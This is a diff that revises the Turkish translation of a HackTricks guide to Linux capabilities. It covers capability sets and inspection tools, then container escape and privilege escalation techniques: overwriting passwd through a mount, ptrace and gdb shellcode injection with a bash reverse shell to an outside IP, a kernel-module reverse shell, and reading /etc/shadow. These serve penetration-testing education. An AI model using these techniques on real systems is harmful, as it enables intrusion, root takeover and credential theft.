@@ -1,45 +1,45 @@
-# Linux Yetenekleri
+# Linux Capabilities
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Linux Yetenekleri
+## Linux Capabilities
 
-Linux yetenekleri **root ayrıcalıklarını daha küçük, belirgin birimlere** böler, böylece süreçlerin bir ayrıcalık alt kümesine sahip olmasına olanak tanır. Bu, tam root ayrıcalıklarını gereksiz yere vermeyerek riskleri en aza indirir.
+Linux yetkileri **root ayrıcalıklarını daha küçük, belirgin birimlere böler**, süreçlerin bir ayrıcalık alt kümesine sahip olmasına olanak tanır. Bu, tam root ayrıcalıklarını gereksiz yere vermeyerek riskleri en aza indirir.
 
 ### Problem:
 
 - Normal kullanıcıların sınırlı izinleri vardır, bu da root erişimi gerektiren bir ağ soketi açma gibi görevleri etkiler.
 
-### Yetenek Setleri:
+### Yetki Setleri:
 
-1. **Miras Alınan (CapInh)**:
+1. **Inherited (CapInh)**:
 
-- **Amaç**: Ebeveyn süreçten devredilen yetenekleri belirler.
-- **Fonksiyon**: Yeni bir süreç oluşturulduğunda, bu setten ebeveyninden yetenekleri miras alır. Süreç oluşturma sırasında belirli ayrıcalıkları korumak için faydalıdır.
-- **Kısıtlamalar**: Bir süreç, ebeveyninin sahip olmadığı yetenekleri kazanamaz.
+- **Amaç**: Ebeveyn süreçten devredilen yetkileri belirler.
+- **Fonksiyon**: Yeni bir süreç oluşturulduğunda, bu setten ebeveyninden yetkileri devralır. Süreç oluşturma sırasında belirli ayrıcalıkları korumak için yararlıdır.
+- **Kısıtlamalar**: Bir süreç, ebeveyninin sahip olmadığı yetkileri kazanamaz.
 
-2. **Etkin (CapEff)**:
+2. **Effective (CapEff)**:
 
-- **Amaç**: Bir sürecin herhangi bir anda kullandığı gerçek yetenekleri temsil eder.
-- **Fonksiyon**: Çeşitli işlemler için izin vermek üzere çekirdek tarafından kontrol edilen yetenekler setidir. Dosyalar için, bu set dosyanın izin verilen yeteneklerinin etkin sayılıp sayılmayacağını belirten bir bayrak olabilir.
-- **Önemi**: Etkin set, anlık ayrıcalık kontrolleri için kritik öneme sahiptir ve bir sürecin kullanabileceği aktif yetenekler seti olarak işlev görür.
+- **Amaç**: Bir sürecin herhangi bir anda kullandığı gerçek yetkileri temsil eder.
+- **Fonksiyon**: Çeşitli işlemler için izin vermek üzere çekirdek tarafından kontrol edilen yetki setidir. Dosyalar için, bu set dosyanın izin verilen yetkilerinin etkili sayılıp sayılmayacağını belirten bir bayrak olabilir.
+- **Önemi**: Etkili set, anlık ayrıcalık kontrolleri için kritik öneme sahiptir ve bir sürecin kullanabileceği aktif yetki seti olarak işlev görür.
 
-3. **İzinli (CapPrm)**:
+3. **Permitted (CapPrm)**:
 
-- **Amaç**: Bir sürecin sahip olabileceği maksimum yetenek setini tanımlar.
-- **Fonksiyon**: Bir süreç, izinli setten bir yeteneği etkin setine yükseltebilir, böylece o yeteneği kullanma yeteneğine sahip olur. Ayrıca, izinli setinden yetenekleri düşürebilir.
-- **Sınır**: Bir sürecin sahip olabileceği yetenekler için üst bir sınır işlevi görür ve bir sürecin önceden tanımlanmış ayrıcalık kapsamını aşmadığından emin olur.
+- **Amaç**: Bir sürecin sahip olabileceği maksimum yetki setini tanımlar.
+- **Fonksiyon**: Bir süreç, izin verilen setten bir yetkiyi etkili setine yükseltebilir, bu da ona o yetkiyi kullanma yeteneği verir. Ayrıca, izin verilen setinden yetkileri düşürebilir.
+- **Sınır**: Bu, bir sürecin sahip olabileceği yetkiler için üst bir sınır işlevi görür ve bir sürecin önceden tanımlanmış ayrıcalık kapsamını aşmadığından emin olur.
 
-4. **Sınırlandırıcı (CapBnd)**:
+4. **Bounding (CapBnd)**:
 
-- **Amaç**: Bir sürecin yaşam döngüsü boyunca edinebileceği yetenekler üzerinde bir tavan koyar.
-- **Fonksiyon**: Bir süreç, miras alınabilir veya izinli setinde belirli bir yeteneğe sahip olsa bile, o yeteneği yalnızca sınırlandırıcı setinde de varsa edinebilir.
-- **Kullanım durumu**: Bu set, bir sürecin ayrıcalık yükseltme potansiyelini kısıtlamak için özellikle faydalıdır ve ek bir güvenlik katmanı ekler.
+- **Amaç**: Bir sürecin yaşam döngüsü boyunca edinebileceği yetkiler üzerinde bir tavan koyar.
+- **Fonksiyon**: Bir süreç, miras alınabilir veya izin verilen setinde belirli bir yetkiye sahip olsa bile, o yetkiyi yalnızca sınırlandırma setinde de varsa edinebilir.
+- **Kullanım durumu**: Bu set, bir sürecin ayrıcalık yükseltme potansiyelini kısıtlamak için özellikle yararlıdır ve ek bir güvenlik katmanı ekler.
 
-5. **Ortam (CapAmb)**:
-- **Amaç**: Belirli yeteneklerin, genellikle sürecin yeteneklerinin tamamen sıfırlanmasına neden olacak bir `execve` sistem çağrısı sırasında korunmasına olanak tanır.
-- **Fonksiyon**: İlgili dosya yeteneklerine sahip olmayan SUID olmayan programların belirli ayrıcalıkları korumasını sağlar.
-- **Kısıtlamalar**: Bu set içindeki yetenekler, miras alınabilir ve izinli setlerin kısıtlamalarına tabidir, böylece sürecin izin verilen ayrıcalıklarını aşmazlar.
+5. **Ambient (CapAmb)**:
+- **Amaç**: Belirli yetkilerin, tipik olarak sürecin yetkilerinin tamamen sıfırlanmasına neden olacak bir `execve` sistem çağrısı sırasında korunmasına olanak tanır.
+- **Fonksiyon**: İlgili dosya yetkilerine sahip olmayan SUID olmayan programların belirli ayrıcalıkları korumasını sağlar.
+- **Kısıtlamalar**: Bu set içindeki yetkiler, miras alınabilir ve izin verilen setlerin kısıtlamalarına tabidir, böylece sürecin izin verilen ayrıcalıklarını aşmazlar.
 ```python
 # Code to demonstrate the interaction of different capability sets might look like this:
 # Note: This is pseudo-code for illustrative purposes only.
@@ -58,23 +58,23 @@ Daha fazla bilgi için kontrol edin:
 
 ### Süreçler Yetenekleri
 
-Belirli bir süreç için yetenekleri görmek için /proc dizinindeki **status** dosyasını kullanın. Daha fazla ayrıntı sağladığı için, bunu yalnızca Linux yetenekleri ile ilgili bilgilere sınırlayalım.\
-Tüm çalışan süreçler için yetenek bilgisi her bir iş parçacığı için korunur, dosya sistemindeki ikili dosyalar için ise genişletilmiş niteliklerde saklanır.
+Belirli bir sürecin yeteneklerini görmek için /proc dizinindeki **status** dosyasını kullanın. Daha fazla ayrıntı sağladığı için, bunu yalnızca Linux yetenekleri ile ilgili bilgilere sınırlayalım.\
+Tüm çalışan süreçler için yetenek bilgisi her bir iş parçacığı başına korunur, dosya sistemindeki ikili dosyalar için ise genişletilmiş niteliklerde saklanır.
 
-Yetenekleri /usr/include/linux/capability.h dosyasında bulabilirsiniz.
+/usr/include/linux/capability.h dosyasında tanımlanan yetenekleri bulabilirsiniz.
 
-Mevcut sürecin yeteneklerini `cat /proc/self/status` komutuyla veya `capsh --print` komutunu kullanarak ve diğer kullanıcıların yeteneklerini `/proc/<pid>/status` dosyasında bulabilirsiniz.
+Mevcut sürecin yeteneklerini `cat /proc/self/status` komutunu kullanarak veya `capsh --print` komutunu çalıştırarak bulabilirsiniz; diğer kullanıcıların yeteneklerini ise `/proc/<pid>/status` dosyasında bulabilirsiniz.
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
 ```
-Bu komut çoğu sistemde 5 satır döndürmelidir.
+Bu komut, çoğu sistemde 5 satır döndürmelidir.
 
-- CapInh = Miras alınan yetkiler
-- CapPrm = İzin verilen yetkiler
-- CapEff = Geçerli yetkiler
+- CapInh = Miras alınan yetenekler
+- CapPrm = İzin verilen yetenekler
+- CapEff = Etkili yetenekler
 - CapBnd = Sınır seti
-- CapAmb = Ortam yetkileri seti
+- CapAmb = Ortam yetenekleri seti
 ```bash
 #These are the typical capabilities of a root owned process (all)
 CapInh: 0000000000000000
@@ -83,7 +83,7 @@ CapEff: 0000003fffffffff
 CapBnd: 0000003fffffffff
 CapAmb: 0000000000000000
 ```
-Bu onaltılık sayılar mantıklı değil. capsh aracını kullanarak bunları yetenek adlarına çözebiliriz.
+Bu onaltılık sayılar mantıklı değil. capsh aracını kullanarak bunları yetenek adlarına dönüştürebiliriz.
 ```bash
 capsh --decode=0000003fffffffff
 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
@@ -100,11 +100,11 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-Çalışsa da, başka ve daha kolay bir yol var. Çalışan bir sürecin yeteneklerini görmek için, **getpcaps** aracını kullanarak ardından süreç kimliğini (PID) yazmanız yeterlidir. Ayrıca bir süreç kimliği listesi de verebilirsiniz.
+Çalışsa da, başka ve daha kolay bir yol vardır. Çalışan bir sürecin yeteneklerini görmek için, **getpcaps** aracını kullanarak ardından süreç kimliğini (PID) yazmanız yeterlidir. Ayrıca bir süreç kimliği listesi de verebilirsiniz.
 ```bash
 getpcaps 1234
 ```
-Burada `tcpdump`'ın yeteneklerini kontrol edelim, ikili dosyaya yeterli yetenekler (`cap_net_admin` ve `cap_net_raw`) verildikten sonra ağ dinlemek için (_tcpdump işlem 9562'de çalışıyor_):
+Burada `tcpdump`'ın yeteneklerini kontrol edelim, ikili dosyaya yeterli yetenekler (`cap_net_admin` ve `cap_net_raw`) verildikten sonra ağı dinlemek için (_tcpdump işlem 9562'de çalışıyor_):
 ```bash
 #The following command give tcpdump the needed capabilities to sniff traffic
 $ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
@@ -122,7 +122,7 @@ CapAmb:    0000000000000000
 $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-Verilen yeteneklerin, bir ikili dosyanın yeteneklerini elde etmenin 2 yolu ile elde edilen sonuçlarla örtüştüğünü görebilirsiniz.\
+Verilen yeteneklerin, bir ikili dosyanın yeteneklerini elde etmenin 2 yolunun sonuçlarıyla örtüştüğünü görebilirsiniz.\
 _getpcaps_ aracı, belirli bir iş parçacığı için mevcut yetenekleri sorgulamak üzere **capget()** sistem çağrısını kullanır. Bu sistem çağrısı, daha fazla bilgi almak için yalnızca PID sağlamayı gerektirir.
 
 ### İkili Dosyaların Yetenekleri
@@ -148,7 +148,7 @@ _bash_ çıktısının yanı sıra, _tcpdump_ komutu da bir hata vermelidir.
 
 Hata, ping komutunun bir ICMP soketi açmasına izin verilmediğini açıkça gösteriyor. Artık bunun beklendiği gibi çalıştığını kesin olarak biliyoruz.
 
-### Yetenekleri Kaldır
+### Yetenekleri Kaldırma
 
 Bir ikili dosyanın yeteneklerini kaldırabilirsiniz.
 ```bash
@@ -157,7 +157,7 @@ setcap -r </path/to/binary>
 ## Kullanıcı Yetenekleri
 
 Görünüşe göre **yetenekler kullanıcılarla da atanabilir**. Bu muhtemelen, kullanıcının yürüttüğü her sürecin kullanıcı yeteneklerini kullanabileceği anlamına geliyor.\
-Buna dayanarak [bu](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [bu](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) ve [bu](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) birkaç dosyanın yapılandırılması gerekiyor, böylece bir kullanıcıya belirli yetenekler verilebilir, ancak yetenekleri her kullanıcıya atayan dosya `/etc/security/capability.conf` olacaktır.\
+[Bu](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [bu](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) ve [bu](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) temelinde, bir kullanıcıya belirli yetenekler vermek için yapılandırılması gereken birkaç dosya var, ancak yetenekleri her kullanıcıya atayan dosya `/etc/security/capability.conf` olacaktır.\
 Dosya örneği:
 ```bash
 # Simple
@@ -172,9 +172,9 @@ cap_net_admin,cap_net_raw    jrnetadmin
 # Combining names and numerics
 cap_sys_admin,22,25          jrsysadmin
 ```
-## Ortam Yetenekleri
+## Environment Capabilities
 
-Aşağıdaki programı derleyerek **yetenekler sağlayan bir ortamda bir bash shell başlatmak** mümkündür.
+Aşağıdaki programı derleyerek **yetenekler sağlayan bir ortamda bir bash shell başlatmak mümkündür**.
 ```c:ambient.c
 /*
 * Test program for the ambient capabilities
@@ -276,7 +276,7 @@ capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 > [!CAUTION]
-> Sadece **hem izin verilen hem de miras alınan setlerde bulunan** yetenekler ekleyebilirsiniz.
+> Sadece **hem izin verilen hem de miras alınan setlerde bulunan** yetenekleri ekleyebilirsiniz.
 
 ### Yetenek farkında/Yetenek cahil ikili dosyalar
 
@@ -285,7 +285,7 @@ Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ## Servis Yetenekleri
 
 Varsayılan olarak, **root olarak çalışan bir servis tüm yetenekleri atamış olacaktır**, ve bazı durumlarda bu tehlikeli olabilir.\
-Bu nedenle, **bir servis yapılandırma** dosyası, **istediğiniz yetenekleri** belirtmenize ve servisi çalıştıracak **kullanıcıyı** tanımlamanıza olanak tanır, böylece gereksiz ayrıcalıklara sahip bir servis çalıştırmaktan kaçınılır:
+Bu nedenle, bir **servis yapılandırma** dosyası, sahip olmasını istediğiniz **yetenekleri** ve servisi çalıştırması gereken **kullanıcıyı** belirtmenize olanak tanır, böylece gereksiz ayrıcalıklara sahip bir servis çalıştırmaktan kaçınılır:
 ```bash
 [Service]
 User=bob
@@ -308,9 +308,9 @@ docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash
 # Remove all and add only one
 docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
 ```
-## Privesc/Konteyner Kaçışı
+## Privesc/Container Escape
 
-Capabilities, **ayrıcalıklı işlemler gerçekleştirdikten sonra kendi süreçlerinizi kısıtlamak istediğinizde** faydalıdır (örneğin, chroot kurduktan ve bir sokete bağlandıktan sonra). Ancak, kötü niyetli komutlar veya argümanlar geçirerek kök olarak çalıştırılabilirler.
+Capabilities, ayrıcalıklı işlemler gerçekleştirdikten sonra **kendi süreçlerinizi kısıtlamak istediğinizde** faydalıdır (örneğin, chroot kurduktan ve bir sokete bağlandıktan sonra). Ancak, kötü niyetli komutlar veya argümanlar geçirerek istismar edilebilirler ve bu komutlar root olarak çalıştırılır.
 
 `setcap` kullanarak programlara yetenekler zorlayabilir ve bunları `getcap` ile sorgulayabilirsiniz:
 ```bash
@@ -321,13 +321,13 @@ setcap cap_net_raw+ep /sbin/ping
 getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
-`+ep` demek, yeteneği ( "-" bunu kaldırır) Etkili ve İzinli olarak ekliyorsunuz.
+`+ep` ifadesi, yeteneği ( "-" bunu kaldırır) Etkili ve İzinli olarak eklediğinizi gösterir.
 
 Bir sistemde veya klasörde yeteneklere sahip programları tanımlamak için:
 ```bash
 getcap -r / 2>/dev/null
 ```
-### Sömürü örneği
+### Exploitasyon örneği
 
 Aşağıdaki örnekte, ikili dosya `/usr/bin/python2.6` privesc için savunmasız bulunmuştur:
 ```bash
@@ -345,7 +345,7 @@ getcap /usr/sbin/tcpdump
 ```
 ### "Boş" yeteneklerin özel durumu
 
-[Belgelerden](https://man7.org/linux/man-pages/man7/capabilities.7.html): Boş yetenek setlerinin bir program dosyasına atanabileceğini unutmayın, bu nedenle etkili ve kaydedilmiş set-user-ID'sini 0 olarak değiştiren bir set-user-ID-root programı oluşturmak mümkündür, ancak bu süreçte o işleme hiçbir yetenek verilmez. Ya da basitçe ifade etmek gerekirse, eğer bir ikili dosyanız varsa:
+[Belgelerden](https://man7.org/linux/man-pages/man7/capabilities.7.html): Boş yetenek setlerinin bir program dosyasına atanabileceğini unutmayın, bu nedenle etkili ve kaydedilmiş set-kullanıcı-ID'sini 0 olarak değiştiren bir set-user-ID-root programı oluşturmak mümkündür, ancak bu sürece hiçbir yetenek kazandırmaz. Ya da basitçe ifade etmek gerekirse, eğer bir ikili dosyanız varsa:
 
 1. root tarafından sahiplenilmemiş
 2. `SUID`/`SGID` bitleri ayarlanmamış
@@ -368,7 +368,7 @@ cp /etc/passwd ./ #Create a copy of the passwd file
 openssl passwd -1 -salt abc password #Get hash of "password"
 vim ./passwd #Change roots passwords of the fake passwd file
 ```
-Ve nihayet **mount** edilmiş `passwd` dosyasını `/etc/passwd` üzerine yerleştirin:
+Ve nihayet **mount** edilmiş `passwd` dosyasını `/etc/passwd` üzerinde:
 ```python
 from ctypes import *
 libc = CDLL("libc.so.6")
@@ -398,7 +398,7 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Önceki çıktıda SYS_ADMIN yetkisinin etkin olduğunu görebilirsiniz.
+İlk önceki çıktıda SYS_ADMIN yetkisinin etkin olduğunu görebilirsiniz.
 
 - **Mount**
 
@@ -417,7 +417,7 @@ chroot ./ bash #You have a shell inside the docker hosts disk
 - **Tam erişim**
 
 Önceki yöntemde docker ana bilgisayar diskine erişmeyi başardık.\
-Eğer ana bilgisayarın bir **ssh** sunucusu çalıştırdığını bulursanız, **docker ana bilgisayar** diskinde bir kullanıcı oluşturabilir ve SSH üzerinden erişebilirsiniz:
+Eğer ana bilgisayarın bir **ssh** sunucusu çalıştığını bulursanız, **docker ana bilgisayar** diskinde bir kullanıcı oluşturabilir ve SSH üzerinden erişebilirsiniz:
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -435,7 +435,7 @@ ssh john@172.17.0.1 -p 2222
 
 **Bu, bir shellcode'u ana makinede çalışan bir süreç içine enjekte ederek konteynerden çıkabileceğiniz anlamına gelir.** Ana makinede çalışan süreçlere erişmek için konteynerin en azından **`--pid=host`** ile çalıştırılması gerekir.
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** `ptrace(2)` tarafından sağlanan hata ayıklama ve sistem çağrısı izleme işlevlerini kullanma yeteneğini ve `process_vm_readv(2)` ve `process_vm_writev(2)` gibi bellekler arası ekleme çağrılarını sağlar. Hata ayıklama ve izleme amaçları için güçlü olmasına rağmen, `CAP_SYS_PTRACE` kısıtlayıcı önlemler olmadan, örneğin `ptrace(2)` üzerinde bir seccomp filtresi olmadan etkinleştirildiğinde, sistem güvenliğini önemli ölçüde zayıflatabilir. Özellikle, diğer güvenlik kısıtlamalarını, özellikle seccomp tarafından dayatılanları aşmak için sömürülebilir; bu, [bu tür kanıtlar (PoC) ile gösterilmiştir](https://gist.github.com/thejh/8346f47e359adecd1d53).
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, `ptrace(2)` tarafından sağlanan hata ayıklama ve sistem çağrısı izleme işlevlerini kullanma yeteneğini ve `process_vm_readv(2)` ve `process_vm_writev(2)` gibi bellekler arası ekleme çağrılarını kullanma yeteneğini verir. Hata ayıklama ve izleme amaçları için güçlü olmasına rağmen, `CAP_SYS_PTRACE` kısıtlayıcı önlemler olmadan, örneğin `ptrace(2)` üzerinde bir seccomp filtresi olmadan etkinleştirildiğinde, sistem güvenliğini önemli ölçüde zayıflatabilir. Özellikle, seccomp tarafından dayatılan diğer güvenlik kısıtlamalarını aşmak için kullanılabilir; bu, [bu tür kanıtlar (PoC) ile gösterilmiştir](https://gist.github.com/thejh/8346f47e359adecd1d53).
 
 **Binary ile örnek (python)**
 ```bash
@@ -529,7 +529,7 @@ print("Final Instruction Pointer: " + hex(registers.rip))
 # Detach from the process.
 libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
-**Örnek ikili (gdb)**
+**Örnek ile ikili (gdb)**
 
 `gdb` ile `ptrace` yetkisi:
 ```
@@ -584,19 +584,19 @@ process 207009 is executing new program: /usr/bin/dash
 ```
 **Örnek ile ortam (Docker breakout) - Başka bir gdb Suistimali**
 
-Eğer **GDB** yüklüyse (veya `apk add gdb` veya `apt install gdb` ile yükleyebilirsiniz) **bir süreci ana makineden hata ayıklayabilir** ve `system` fonksiyonunu çağırmasını sağlayabilirsiniz. (Bu teknik ayrıca `SYS_ADMIN` yetkisini de gerektirir)**.**
+Eğer **GDB** yüklüyse (veya `apk add gdb` veya `apt install gdb` ile yükleyebilirsiniz) **host'tan bir süreci debug'layabilir** ve `system` fonksiyonunu çağırmasını sağlayabilirsiniz. (Bu teknik ayrıca `SYS_ADMIN` yetkisini de gerektirir)**.**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
 (gdb) call (void)system("sleep 5")
 (gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
 ```
-Komutun çıktısını göremeyeceksiniz ama bu işlem tarafından yürütülecek (yani bir rev shell alın).
+Komutun çıktısını göremeyeceksiniz ama bu işlem tarafından yürütülecektir (bu yüzden bir rev shell alın).
 
 > [!WARNING]
 > "No symbol "system" in current context." hatasını alırsanız, gdb aracılığıyla bir programda shellcode yükleyen önceki örneği kontrol edin.
 
-**Ortam ile örnek (Docker breakout) - Shellcode Enjeksiyonu**
+**Ortam ile Örnek (Docker breakout) - Shellcode Enjeksiyonu**
 
 Docker konteyneri içinde etkinleştirilen yetenekleri kontrol edebilirsiniz:
 ```bash
@@ -621,18 +621,18 @@ List **processes** running in the **host** `ps -eaf`
 
 ## CAP_SYS_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bir sürece **kernel modüllerini yükleme ve kaldırma (`init_module(2)`, `finit_module(2)` ve `delete_module(2)` sistem çağrıları)** yetkisi verir, bu da çekirdeğin temel işlemlerine doğrudan erişim sağlar. Bu yetenek, çekirdekte değişiklik yaparak tüm Linux güvenlik mekanizmalarını, Linux Güvenlik Modülleri ve konteyner izolasyonu dahil olmak üzere, atlayarak ayrıcalık yükseltme ve toplam sistem tehlikesi oluşturma riski taşır.  
-**Bu, **host makinesinin çekirdeğine kernel modüllerini ekleyip/çıkarabileceğiniz anlamına gelir.**
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, bir süreci **çekirdek modüllerini yükleme ve kaldırma (`init_module(2)`, `finit_module(2)` ve `delete_module(2)` sistem çağrıları)** yetkisi ile güçlendirir ve çekirdeğin temel işlemlerine doğrudan erişim sağlar. Bu yetenek, çekirdekte değişiklik yaparak tüm Linux güvenlik mekanizmalarını, Linux Güvenlik Modülleri ve konteyner izolasyonu dahil olmak üzere, atlayarak ayrıcalık yükseltme ve toplam sistem tehlikesi oluşturma riski taşır.  
+**Bu, ana makinenin çekirdeğine çekirdek modüllerini ekleyip/kaldırabileceğiniz anlamına gelir.**
 
 **Example with binary**
 
-Aşağıdaki örnekte **`python`** ikilisi bu yetkiye sahiptir.
+Aşağıdaki örnekte, ikili **`python`** bu yetkiye sahiptir.
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
 Varsayılan olarak, **`modprobe`** komutu bağımlılık listesini ve harita dosyalarını **`/lib/modules/$(uname -r)`** dizininde kontrol eder.\
-Bunu kötüye kullanmak için sahte bir **lib/modules** klasörü oluşturalım:
+Bunu kötüye kullanmak için, sahte bir **lib/modules** klasörü oluşturalım:
 ```bash
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
@@ -655,11 +655,11 @@ Aşağıdaki örnekte ikili **`kmod`** bu yetkiye sahiptir.
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
 ```
-Bu, **`insmod`** komutunu kullanarak bir çekirdek modülü eklemenin mümkün olduğu anlamına gelir. Bu ayrıcalığı kötüye kullanarak bir **reverse shell** almak için aşağıdaki örneği takip edin.
+Bu, **`insmod`** komutunu kullanarak bir çekirdek modülü eklemenin mümkün olduğu anlamına gelir. Aşağıdaki örneği takip ederek bu yetkiyi kötüye kullanarak bir **reverse shell** elde edebilirsiniz.
 
 **Ortam ile örnek (Docker breakout)**
 
-Docker konteyneri içinde etkinleştirilen yetenekleri kontrol etmek için:
+Docker konteyneri içinde etkinleştirilen yetkileri kontrol etmek için:
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -674,7 +674,7 @@ groups=0(root)
 ```
 İlk önce, **SYS_MODULE** yetkisinin etkin olduğunu görebilirsiniz.
 
-**Ters shell** çalıştıracak **kernel modülünü** ve onu **derlemek** için **Makefile**'ı oluşturun:
+**Ters shell** çalıştıracak **kernel modülünü** ve bunu **derlemek** için **Makefile**'ı oluşturun:
 ```c:reverse-shell.c
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -709,7 +709,7 @@ clean:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
 > [!WARNING]
-> Makefile'deki her make kelimesinden önceki boş karakter **bir sekme olmalıdır, boşluk değil**!
+> Makefile içindeki her make kelimesinden önceki boş karakter **bir sekme olmalıdır, boşluk değil**!
 
 Bunu derlemek için `make` komutunu çalıştırın.
 ```
@@ -728,16 +728,16 @@ insmod reverse-shell.ko #Launch the reverse shell
 ```
 **Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **adresindeki "SYS_MODULE Yetkisini Kötüye Kullanma" laboratuvarından kopyalanmıştır.**
 
-Bu tekniğin bir başka örneği [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) adresinde bulunabilir.
+**Bu tekniğin bir başka örneği** [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) **adresinde bulunabilir.**
 
 ## CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html), bir sürecin **dosyaları okuma ve dizinleri okuma ve yürütme izinlerini atlamasını** sağlar. Temel kullanımı dosya arama veya okuma amaçlıdır. Ancak, aynı zamanda bir sürecin `open_by_handle_at(2)` fonksiyonunu kullanmasına da izin verir; bu fonksiyon, sürecin montaj ad alanının dışındaki dosyalar da dahil olmak üzere herhangi bir dosyaya erişebilir. `open_by_handle_at(2)`'de kullanılan tanıtıcı, `name_to_handle_at(2)` aracılığıyla elde edilen şeffaf olmayan bir tanımlayıcı olmalıdır, ancak değiştirmeye karşı savunmasız olan inode numaraları gibi hassas bilgileri içerebilir. Bu yetkinin kötüye kullanılma potansiyeli, özellikle Docker konteynerleri bağlamında, Sebastian Krahmer tarafından şok edici bir istismar ile gösterilmiştir; bu konu [burada](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analiz edilmiştir.  
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html), bir sürecin **dosyaları okuma ve dizinleri okuma ve yürütme izinlerini atlamasını** sağlar. Temel kullanımı dosya arama veya okuma amaçlıdır. Ancak, aynı zamanda bir sürecin `open_by_handle_at(2)` fonksiyonunu kullanmasına da izin verir; bu fonksiyon, sürecin montaj ad alanının dışındaki dosyalar da dahil olmak üzere herhangi bir dosyaya erişebilir. `open_by_handle_at(2)`'de kullanılan tanıtıcı, `name_to_handle_at(2)` aracılığıyla elde edilen şeffaf olmayan bir tanımlayıcı olmalıdır, ancak inode numaraları gibi manipülasyona açık hassas bilgileri de içerebilir. Bu yetkinin kötüye kullanılma potansiyeli, özellikle Docker konteynerleri bağlamında, Sebastian Krahmer tarafından şok edici bir istismar ile gösterilmiştir; bu konu [burada](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analiz edilmiştir.  
 **Bu, dosya okuma izin kontrollerini ve dizin okuma/yürütme izin kontrollerini atlayabileceğiniz anlamına gelir.**
 
 **İkili ile örnek**
 
-İkili, herhangi bir dosyayı okuyabilecektir. Yani, eğer bir tar dosyası bu yetkiye sahipse, gölge dosyasını okuyabilecektir:
+İkili, herhangi bir dosyayı okuyabilecektir. Yani, eğer tar gibi bir dosya bu yetkiye sahipse, gölge dosyasını okuyabilecektir:
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
@@ -753,7 +753,7 @@ for r, d, f in os.walk('/root'):
 for filename in f:
 print(filename)
 ```
-Ve bir dosyayı okumak için şunu yapabilirsiniz:
+Bir dosyayı okumak için şunları yapabilirsiniz:
 ```python
 print(open("/etc/shadow", "r").read())
 ```
@@ -776,7 +776,7 @@ groups=0(root)
 
